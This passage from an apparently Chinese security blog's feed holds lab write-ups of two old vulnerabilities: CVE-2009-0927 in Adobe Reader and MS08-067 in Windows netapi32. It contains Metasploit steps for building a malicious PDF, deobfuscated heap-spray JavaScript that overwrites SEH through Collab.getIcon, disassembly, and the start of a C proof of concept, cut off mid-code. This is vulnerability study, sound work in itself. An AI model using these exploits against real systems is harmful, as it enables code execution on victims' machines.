class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">%<span class="variable constant_">PDF</span>-<span class="number">1.1</span> <span class="comment">//头部，说明次 PDF 文档符合 PDF1.1 规范</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    <span class="regexp">/Type /</span><span class="title class_">Catalog</span> <span class="comment">//说明这个 obj 是 Catalog 对象</span></span><br><span class="line">    /<span class="title class_">Outlines</span> <span class="number">2</span> <span class="number">0</span> R <span class="comment">//第二个 obj 是 Outlines</span></span><br><span class="line">    /<span class="title class_">Pages</span> <span class="number">3</span> <span class="number">0</span> R <span class="comment">//第三个 obj 是 Pages</span></span><br><span class="line">    /<span class="title class_">OpenAction</span> <span class="number">7</span> <span class="number">0</span> R <span class="comment">//第七个 obj 是 OpenAction，听这个名字大家也应该能感觉到有点料，文件打开时会执行它里边的脚本</span></span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line"><span class="number">2</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    <span class="regexp">/Type /</span><span class="title class_">Outlines</span></span><br><span class="line">    /<span class="title class_">Count</span> <span class="number">0</span> <span class="comment">//0 表示没有书签</span></span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line"><span class="number">3</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    <span class="regexp">/Type /</span><span class="title class_">Pages</span></span><br><span class="line">    /<span class="title class_">Kids</span> [<span class="number">4</span> <span class="number">0</span> R] <span class="comment">//说明它的孩子、页的对象号为 4</span></span><br><span class="line">    /<span class="title class_">Count</span> <span class="number">1</span> <span class="comment">//说明页码数量为 1</span></span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line"><span class="number">4</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    <span class="regexp">/Type /</span><span class="title class_">Page</span></span><br><span class="line">    /<span class="title class_">Parent</span> <span class="number">3</span> <span class="number">0</span> R <span class="comment">//其父对象的对象号为 3</span></span><br><span class="line">    /<span class="title class_">MediaBox</span> [<span class="number">0</span> <span class="number">0</span> <span class="number">612</span> <span class="number">792</span>] <span class="comment">//页面的显示大小，以象素为单位</span></span><br><span class="line">    /<span class="title class_">Contents</span> <span class="number">5</span> <span class="number">0</span> R <span class="comment">//内容对象的对象号为 5</span></span><br><span class="line">    /<span class="title class_">Resources</span> &lt;&lt; <span class="comment">//说明该页所要包含的资源，包括字体和内容的类型</span></span><br><span class="line">                <span class="regexp">/ProcSet [/PDF /Text]</span></span><br><span class="line"><span class="regexp">                /</span><span class="title class_">Font</span> &lt;&lt; /<span class="variable constant_">F1</span> <span class="number">6</span> <span class="number">0</span> R &gt;&gt;</span><br><span class="line">&gt;&gt;</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line"><span class="number">5</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt; <span class="regexp">/Length 98 &gt;&gt; /</span><span class="regexp">/stream 对象为字节数，从 BT 开始， ET 结束，包括中间的行结束符</span></span><br><span class="line"><span class="regexp">stream /</span><span class="regexp">/流对象开始</span></span><br><span class="line"><span class="regexp">BT /</span><span class="variable constant_">F1</span> <span class="number">12</span> <span class="title class_">Tf</span> <span class="number">100</span> <span class="number">700</span> <span class="title class_">Td</span> <span class="number">15</span> <span class="variable constant_">TL</span> (<span class="title class_">Open</span> <span class="title class_">File</span> <span class="title class_">Error</span>! <span class="title class_">Maybe</span> the file is damaged! <span class="comment">//文本位置和内容</span></span><br><span class="line">) <span class="title class_">Tj</span> <span class="variable constant_">ET</span></span><br><span class="line">endstream <span class="comment">//流对象结束</span></span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line"><span class="number">6</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    <span class="regexp">/Type /</span><span class="title class_">Font</span> <span class="comment">//字体对象</span></span><br><span class="line">    /<span class="title class_">Subtype</span> /<span class="title class_">Type1</span></span><br><span class="line">    /<span class="title class_">Name</span> /<span class="variable constant_">F1</span></span><br><span class="line">    /<span class="title class_">BaseFont</span> /<span class="title class_">Helvetica</span></span><br><span class="line">    /<span class="title class_">Encoding</span> /<span class="title class_">MacRomanEncoding</span></span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line"><span class="number">7</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    <span class="regexp">/Type /</span><span class="title class_">Action</span></span><br><span class="line">    /S /<span class="title class_">JavaScript</span></span><br><span class="line">    /<span class="variable constant_">JS</span> ( <span class="comment">//可以放置 JavaScript 脚本，关键部分噢</span></span><br><span class="line">   </span><br><span class="line">   )</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">xref <span class="comment">//交叉引用表</span></span><br><span class="line"><span class="number">0</span> <span class="number">8</span> <span class="comment">//说明下面的描述是从 0 号对象开始，数量为 8</span></span><br><span class="line"><span class="number">0000000000</span> <span class="number">65535</span> f <span class="comment">//一般每个 PDF 文件都是以这一行开始交叉应用表的，说明对象 0 的起始地址为 0000000000，产生号（generation number）为 65535，也是最大产生号，不可以再进行更改，而且最后对象的表示是 f, 表明该对象为 free</span></span><br><span class="line"><span class="number">0000000010</span> <span class="number">00000</span> n <span class="comment">//表示对象 1， 也就是 catalog 对象了，0000000009 是其偏移地址，00000 为 5 位产生号，全 0 表明该对象未被修改过， n 表示该对象在使用。</span></span><br><span class="line"><span class="number">0000000098</span> <span class="number">00000</span> n</span><br><span class="line"><span class="number">0000000147</span> <span class="number">00000</span> n</span><br><span class="line"><span class="number">0000000208</span> <span class="number">00000</span> n</span><br><span class="line"><span class="number">0000000400</span> <span class="number">00000</span> n</span><br><span class="line"><span class="number">0000000549</span> <span class="number">00000</span> n</span><br><span class="line"><span class="number">0000000663</span> <span class="number">00000</span> n</span><br><span class="line"></span><br><span class="line">trailer <span class="comment">//尾部</span></span><br><span class="line">&lt;&lt;</span><br><span class="line">    <span class="regexp">/Size 8 /</span><span class="regexp">/该 PDF 对象数</span></span><br><span class="line"><span class="regexp">    /</span><span class="title class_">Root</span> <span class="number">1</span> <span class="number">0</span> R <span class="comment">//根对象的对象号为 1</span></span><br><span class="line">&gt;&gt;</span><br><span class="line">startxref</span><br><span class="line"><span class="number">1946</span> <span class="comment">//交叉引用表的偏移地址</span></span><br><span class="line">%%<span class="variable constant_">EOF</span> <span class="comment">//文件结束标志</span></span><br></pre></td></tr></table></figure><h1 id="漏洞原理及利用分析"><a class="markdownIt-Anchor" href="#漏洞原理及利用分析"></a> 漏洞原理及利用分析</h1><h2 id="实验环境"><a class="markdownIt-Anchor" href="#实验环境"></a> 实验环境</h2><table><thead><tr><th></th><th>推荐使用的环境</th><th>备 注</th></tr></thead><tbody><tr><td>操作系统</td><td>Windows XP SP3</td><td>建议在虚拟机 VMware 7.0 中运行</td></tr><tr><td>Adobe Reader 版本</td><td>9.0 中文版</td><td></td></tr></tbody></table><h2 id="漏洞分析"><a class="markdownIt-Anchor" href="#漏洞分析"></a> 漏洞分析</h2><p>PDF 文件一旦被打开就会执行 OpenAction 对象里的脚本，所以只要在 OpenAction 对象中精心构造 JS 脚本，就能实现对 Adobe Reader 的攻击。</p><p>首先在 kali 中用 msf 生成样本，具体如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt; msf5 &gt; search cve-<span class="number">2009</span>-0927</span><br><span class="line"></span><br><span class="line">&gt; exploit/windows/browser/adobe_geticon     <span class="number">2009</span>-03-<span class="number">24</span>       good  No     Adobe Collab.getIcon() Buffer Overflow</span><br><span class="line">&gt; exploit/windows/fileformat/adobe_geticon  <span class="number">2009</span>-03-<span class="number">24</span>       good  No     Adobe Collab.getIcon() Buffer Overflow</span><br><span class="line"></span><br><span class="line">&gt; msf5 &gt; use exploit/windows/fileformat/adobe_geticon</span><br><span class="line">&gt; msf5 exploit(windows/fileformat/adobe_geticon) &gt; <span class="built_in">set</span> payload windows/<span class="built_in">exec</span></span><br><span class="line">&gt; payload =&gt; windows/<span class="built_in">exec</span></span><br><span class="line">&gt; msf5 exploit(windows/fileformat/adobe_geticon) &gt; <span class="built_in">set</span> cmd calc.exe</span><br><span class="line">&gt; cmd =&gt; calc.exe</span><br><span class="line">&gt; msf5 exploit(windows/fileformat/adobe_geticon) &gt; run</span><br></pre></td></tr></table></figure><p>生成样本以后，运行一下成功弹出计算器，之后我们用<code>PDFStreamDump</code>打开，在对象5处可以看到样本中包含的payload，dump下来之后，发现payload中的js用了超长变量名，不利于阅读代码，把变量名替换以后，得到如下可读代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> shellcode = <span class="built_in">unescape</span>(<span class="string">&quot;%u4096%ud6f9%u9147%ufd98%ufd9b%uf840%u9047......&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> nopblock = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"># 布置堆的内容</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">128</span>; i &gt;= <span class="number">0</span>; --i) </span><br><span class="line">&#123;</span><br><span class="line">    nopblock += <span class="built_in">unescape</span>(<span class="string">&quot;%u9090%u9090&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">buff = nopblock + shellcode;</span><br><span class="line">nop = <span class="built_in">unescape</span>(<span class="string">&quot;%u9090%u9090&quot;</span>);</span><br><span class="line">headersize = <span class="number">20</span>;</span><br><span class="line">acl = headersize + buff.<span class="property">length</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (nop.<span class="property">length</span> &lt; acl) </span><br><span class="line">&#123;</span><br><span class="line">    nop += nop;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fillblock = nop.<span class="title function_">substring</span>(<span class="number">0</span>, acl);</span><br><span class="line">block = nop.<span class="title function_">substring</span>(<span class="number">0</span>, nop.<span class="property">length</span> - acl);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (block.<span class="property">length</span> + acl &lt; <span class="number">0x40000</span>)</span><br><span class="line">&#123;</span><br><span class="line">    block = block + block + fillblock;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">memory = <span class="keyword">new</span> <span class="title class_">Array</span>();</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">1450</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line">    memory[j] = block + buff;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 用<span class="number">0x0a0a0a0a</span>占领<span class="variable constant_">SEH</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ret_addr = <span class="built_in">unescape</span>(<span class="string">&quot;%0a&quot;</span>);</span><br><span class="line"><span class="keyword">while</span> (ret_addr.<span class="property">length</span> &lt; <span class="number">0x4000</span>)</span><br><span class="line">&#123;</span><br><span class="line">    ret_addr += ret_addr;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">ret_addr = <span class="string">&quot;N.&quot;</span> + ret_addr; <span class="comment">//注意这里的 N.</span></span><br><span class="line"><span class="title class_">Collab</span>.<span class="title function_">getIcon</span>(ret_addr);</span><br></pre></td></tr></table></figure><p>首先用 OllyDbg 加载 Adobe Reader，待其启动完成后通过 Adobe Reader 的菜单打开 POC 文档， OllyDbg 会因为一个写入异常而中断。</p><p><img src="/2022/07/22/CVE-2009-0927%EF%BC%9APDF%E4%B8%AD%E7%9A%84JS/image-20220721154949364.png" alt="image-20220721154949364"></p><p>从上图中可以看到，程序在向 0x00130000 位置写入数据时发生异常，因为 0x00130000 这个地址已经超出程序的栈空间范围，一般是由于复制了超长字符串所致。</p><p>同时栈顶的 strncpy 也印证了我们的猜想，问题可能出现在这里，不妨进入 0x2210FE4E 区域看看。</p><p><img src="/2022/07/22/CVE-2009-0927%EF%BC%9APDF%E4%B8%AD%E7%9A%84JS/image-20220721161909784.png" alt="image-20220721161909784"></p><p>发现在 0x2210FE25 处的 <code>call edi</code> 指令调用了 strncpy 函数，着应该就是溢出根源了。但是 strncpy 函数限制了复制字符串长度，为什么还会溢出呢？继续向上看，原来上面将源字符串长度作为了复制字符串长度，这就相当于执行了 strcpy，当源字符串长度大于目标缓冲区长度时就会发生溢出。</p><h2 id="利用分析"><a class="markdownIt-Anchor" href="#利用分析"></a> 利用分析</h2><p>漏洞原理清楚后，我们就要考虑如何利用这个漏洞了，这里我们可以选择覆盖函数的返回地址或者覆盖程序的异常处理函数指针，我们选择后者。</p><p><img src="/2022/07/22/CVE-2009-0927%EF%BC%9APDF%E4%B8%AD%E7%9A%84JS/image-20220721163130184.png" alt="image-20220721163130184"></p><p>回顾一下 exploit 的思路：通过 Heap Spray 技术占领内存中的 0x0C0C0C0C 位置，然后再向 getIcon()函数传递超长字符串来覆盖程序的异常处理函数指针；同时这个超长字符串还有一个使命就是触发异常——当这个字符串足够长的时候（超出当前堆栈范围）就会触发写入异常，程序因此转入已被篡改了的异常处理函数，最终执行 shellcode。</p><p>最后，计算器也弹了出来：</p><p><img src="/2022/07/22/CVE-2009-0927%EF%BC%9APDF%E4%B8%AD%E7%9A%84JS/image-20220721163229851.png" alt="image-20220721163229851"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;cve-2009-0927-简介&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#cve-2009-0927-简介&quot;&gt;&lt;/a&gt; CVE-2009-0927 简介&lt;/h1&gt;
&lt;p&gt;Adobe Reader 是非常流</summary>
      
    
    
    
    <category term="0day安全" scheme="https://www.rgzzplus.com/categories/0day%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="漏洞" scheme="https://www.rgzzplus.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>RPC入侵：MS08-067</title>
    <link href="https://www.rgzzplus.com/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/"/>
    <id>https://www.rgzzplus.com/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/</id>
    <published>2022-07-20T08:15:17.000Z</published>
    <updated>2022-08-01T11:20:03.340Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="ms08-067-简介"><a class="markdownIt-Anchor" href="#ms08-067-简介"></a> MS08-067 简介</h1><p>MS08-067 漏洞是由于 netapi32.dll 的导出函数 NetpwPathCanonicalize 在处理字符串时出现了错误，从而导致栈溢出，并且影响的操作系统范围很广，包括引入了 GS 安全机制的 Windows XP SP2、 Vista 以及 Windows 7。</p><p>MS08-067 的溢出发生在 NetpwPathCannonicalize 函数的子函数 CanonicalizePathName 中。当路径合并至临时的栈空间 Buff_OF 后， CanonicalizePathName 函数并不是直接将其复制到输出参数 can_path 中，而是要对 Buff_OF 串做以下三步操作，以对路径规范化。</p><p>1）将合并路径中的所有的 slash 字符‘ /’（ 0x2F）转化为 backslash 字符‘ \’（ 0x5C）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">5FDDA1F0 lea eax, [ebp+Buff_OF]</span><br><span class="line">5FDDA1F6 jz short @@chk_dos_path_type</span><br><span class="line">5FDDA1F8 @@replace_slash_loop:</span><br><span class="line">5FDDA1F8 cmp word ptr [eax], &#x27;/&#x27;</span><br><span class="line">5FDDA1FC jz @@slash_to_back_slash</span><br><span class="line">5FDDA202 @@slash_to_back_forward:</span><br><span class="line">5FDDA202 inc eax</span><br><span class="line">5FDDA203 inc eax</span><br><span class="line">5FDDA204 cmp word ptr [eax], 0</span><br><span class="line">5FDDA208 jnz short @@replace_slash_loop</span><br><span class="line">...</span><br><span class="line">5FDE88EF @@slash_to_back_slash:</span><br><span class="line">5FDE88EF mov word ptr [eax], &#x27;\&#x27;</span><br><span class="line">5FDE88F4 jmp @@slash_to_back_forward</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>2）调用子函数 CheckDosPathType，检查合并路径的 DOS 路径类型，由于与溢出无关，不用深究其原理，我们只需了解这个函数的返回值，如果返回0，代码即将进入产生溢出的函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">5FDDA20A @@chk_dos_path_type:</span><br><span class="line">5FDDA20A lea eax, [ebp+Buff_OF]</span><br><span class="line">5FDDA210 call CheckDosPathType</span><br><span class="line">5FDDA215 test eax, eax</span><br><span class="line">5FDDA217 jnz short @@chk_buf_of_len</span><br><span class="line">5FDDA219 lea eax, [ebp+Buff_OF]</span><br><span class="line">5FDDA21F push eax</span><br><span class="line">5FDDA220 call RemoveLegarcyFolder;溢出函数</span><br><span class="line">5FDDA225 test eax, eax</span><br><span class="line">5FDDA227 jz short @@err_invalid_name</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>3）溢出就发生在子函数 RemoveLegacyFolder 中； RemoveLegacyFolder 返回后，如果返回非零，表示合并路径已符合要求，若其长度未超过 maxbuf，即可复制至 can_path 中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">5FDDA229 @@chk_buf_of_len:</span><br><span class="line">5FDDA229 lea eax, [ebp+Buff_OF]</span><br><span class="line">5FDDA22F push eax</span><br><span class="line">5FDDA230 call esi ; __imp_wcslen</span><br><span class="line">5FDDA232 lea eax, [eax+eax+2]</span><br><span class="line">5FDDA236 cmp eax, [ebp+arg_MaxBuf]</span><br><span class="line">5FDDA239 pop ecx</span><br><span class="line">5FDDA23A ja @@chk_retsize</span><br><span class="line">5FDDA240 lea eax, [ebp+Buff_OF]</span><br><span class="line">5FDDA246 push eax ; Source: Buff_OF</span><br><span class="line">5FDDA247 push [ebp+Outbuf] ; Dest: same as can_path</span><br><span class="line">5FDDA24D call ds:__imp_wcscpy</span><br><span class="line">5FDDA253 pop ecx</span><br><span class="line">5FDDA254 pop ecx</span><br><span class="line">5FDDA255 xor eax, eax</span><br><span class="line">5FDDA257 @@chk_security_cookie:</span><br><span class="line">5FDDA257 mov ecx, [ebp+security_cookie]</span><br><span class="line">5FDDA25A pop edi</span><br><span class="line">5FDDA25B pop esi</span><br><span class="line">5FDDA25C pop ebx</span><br><span class="line">5FDDA25D call chk_security_cookie</span><br><span class="line">5FDDA262 leave</span><br><span class="line">5FDDA263 retn 14h</span><br><span class="line">...</span><br><span class="line">5FDE88F9 @@chk_retsize:</span><br><span class="line">5FDE88F9 mov ecx, [ebp+RetSize]</span><br><span class="line">5FDE88FF test ecx, ecx</span><br><span class="line">5FDE8901 jz short @@err_buf_too_small</span><br><span class="line">5FDE8903 mov [ecx], eax</span><br><span class="line">5FDE8905 @@err_buf_too_small:</span><br><span class="line">5FDE8905 mov eax, NERR_BufTooSmall</span><br><span class="line">5FDE890A jmp @@chk_security_cookie</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h1 id="认识-legacy-folder"><a class="markdownIt-Anchor" href="#认识-legacy-folder"></a> 认识 Legacy Folder</h1><p>Legacy Folder，又叫经典目录，指的是 ’.‘ (当前目录) 和 ‘…’ (上一层目录)这两个特殊的目录。</p><p>在对路径进行范式化的过程中，函数 RemoveLegacyFolder 的作用就是将合并路径中的经典目录移去（后面简称“移经”），使路径达到最简洁状态。</p><h1 id="移经-测试"><a class="markdownIt-Anchor" href="#移经-测试"></a> “移经” 测试</h1><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/image-20220719143626519.png" alt="image-20220719143626519" style="zoom:67%;"><p>通过黑盒测试，可以看出 RemoveLegacyFolder 函数具有以下特性：</p><p>1）通过 II、 III 对比，目录名是以‘\’作为隔离符的，如果‘…\’ 的左边没有隔离符了，“移经”将失败；<br>2）由 VIII 可以看出，在路径中部（注意，不是首部），如果有两个连续的隔离符‘\’，“移经”将失败；<br>3） XI 的返回值非零，但是合并路径中却有内容，表明“移经”操作应该通过并已经复制到 can_path 中，很可能是在最后的检查过程中，出现了错误。通过查看汇编代码，原来在路径合并结束后， NetpaPathCanonicalize 还会调用 NetpwPathType 函数对合并路径进行检查，并将 NetpwPathType 的结果作为整个函数的返回值。 XI 中的合并路径\\aaa 显然不是一个合法的路径</p><h1 id="移经-风险"><a class="markdownIt-Anchor" href="#移经-风险"></a> “移经” 风险</h1><p>‘ <code>.\</code>’ 的移去操作很简单：只需要调用一次字符复制函数即可将 “经典目录” 移去。<br><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/image-20220719144447435.png" alt="image-20220719144447435" style="zoom: 50%;"></p><p>‘<code>..\</code>’ 的移去操作却麻烦了不少：</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/image-20220719214318308.png" alt="image-20220719214318308"></p><p>如果 p1 为当前指针， p2 和 p1 总是相差 3 个字符的位置，但仅凭 p1、 p2 是无法获取 p3 ，因为 FOLDER2 的长度不固定，对于获取 p3 的位置，主要有两种解决方法：</p><ul><li><strong>事先定义变量记录每一个 \ 的位置</strong>；当复制结束后，当前指针 p1 的值更新为 p3， p3 的值更新为 p4；同 p3 一样， p4 也需要变量进行记录。</li><li><strong>如果不定义变量</strong>，则可以在“移经”后的路径中，从 p1 左侧开始，向左搜索首次出现的 ‘\’，即 p3；如果 p1 依然指向经典目录 ‘…\’，那么 p3 就是下一次 “移经” 复制的目的地址。</li></ul><p>RemoveLegacyFolder 函数采用的是不定义变量更新 p3，然而正是这个 “向左（前）搜索” 存在着 “风险”。</p><h2 id="静态分析"><a class="markdownIt-Anchor" href="#静态分析"></a> 静态分析</h2><p>函数调用链 <code>NetpwPathCanonicalize-&gt;CanonicalizePathName-&gt;RemoveLegacyFolder</code></p><h3 id="netpwpathcanonicalize"><a class="markdownIt-Anchor" href="#netpwpathcanonicalize"></a> NetpwPathCanonicalize</h3><p>**函数作用：**NetpwPathCanonicalize用于格式化网络路径字符串。</p><p>如果prefix串非空，将prefix串与path串用<code>\</code>相连，并复制输出到串<code>can_path</code>中，输出串的容量为maxbuf字节大小。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prefix + &#x27;\&#x27; + path =&gt; can_path [max_buf]</span><br></pre></td></tr></table></figure><p><strong>函数原型</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Int <span class="title function_">NetpwPathCanonicalize</span><span class="params">(</span></span><br><span class="line"><span class="params">    Uint16 path[ ],            <span class="comment">// [in]    path name</span></span></span><br><span class="line"><span class="params">    Uint8 can_path[ ],        <span class="comment">// [out]  canonicalized path</span></span></span><br><span class="line"><span class="params">    Uint32 maxbuf,            <span class="comment">// [in]     max size of can_path</span></span></span><br><span class="line"><span class="params">    Uint16 prefix[ ],        <span class="comment">// [in]     path prefix</span></span></span><br><span class="line"><span class="params">    Uint32* pathtype,        <span class="comment">// [int out] path type</span></span></span><br><span class="line"><span class="params">    Uint32 pathflags        <span class="comment">// [in]    path flags, 0 or 1</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>通过 NetpwPathCanonicalize 函数，找到 CanonicalizePathName 函数。<br><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/image-20220719230053057.png" alt="image-20220719230053057"></p><p>在CanonicalizePathName 中找到 RemoveLegacyFolder 函数。</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/image-20220719221744326.png" alt="image-20220719221744326"></p><h2 id="动态调试"><a class="markdownIt-Anchor" href="#动态调试"></a> 动态调试</h2><p>在调用 RemoveLegacyFolder 时，RemoveLegacyFolder 的返回地址位于 0x12F6A4；待处理的合并路径，即 Buff_OF（ 0x12F6A8）指向的 unicode 串位于稍大的栈地址 0x12F6C0，是唯一的输入参数。</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/image-20220719222947145.png" alt="image-20220719222947145"></p><p>在移去经典目录‘ …\’后， RemoveLegacyFolder 函数会向左（前）即低地址空间搜索隔离字符‘ \’，如果前向搜索越过了待处理串的起始字符，即小于 0x12F6C0，搜索的结果将不可控，很可能远小于 ESP；当合并路径中再次出现经典目录‘ …\’并需要移去时，复制操作会将路径数据写入前面搜索到的栈地址，产生溢出，如果路径数据经过精心设计，很可能使某个函数的返回地址被覆盖修改，使溢出被成功利用。</p><p>总结，成功溢出的条件：<br>1）充分条件：前向搜索隔离符时，越过了 Buff_OF 指向的待处理串。<br>2）必要条件：合并路径中至少存在两个连续的经典目录‘…\’。<br>3）必要条件：合并路径中第二个‘…\’后有足够多的字符数以覆盖返回地址。</p><h1 id="poc-的构造"><a class="markdownIt-Anchor" href="#poc-的构造"></a> POC 的构造</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(__stdcall *MYPROC)</span> <span class="params">(LPWSTR, LPWSTR, DWORD,LPWSTR, LPDWORD,DWORD)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    WCHAR path[<span class="number">256</span>];</span><br><span class="line">    WCHAR can_path[<span class="number">256</span>];</span><br><span class="line">    DWORD type = <span class="number">1000</span>;</span><br><span class="line">    <span class="type">int</span> retval;</span><br><span 